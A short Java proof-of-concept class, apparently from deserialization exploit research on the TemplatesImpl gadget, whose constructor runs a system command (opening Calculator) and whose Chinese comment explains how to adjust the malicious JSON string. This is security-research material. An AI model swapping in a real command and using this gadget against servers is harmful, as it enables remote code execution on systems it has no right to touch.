package org.lain.poc.TemplatesImpl;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
/**
 * @author: ZH3FENG
 * @Date: 下午9:10 2017/12/11
 * @Modified By:
 * @Description: 模拟恶意类，需要继承AbstractTranslet（具体需要跟进源码），如果不继承，则需要修改带解析的json string，增加两个字段：
 *               1）_transletIndex: 0
 *               2）_auxClasses: {}
 *               (需在_outputProperties之前)
 */
public class EvilObject /*extends AbstractTranslet */{

    public EvilObject() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }



    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }


    public static void main(String[] args) throws Exception {
        //test
        EvilObject evilObject = new EvilObject();
    }
}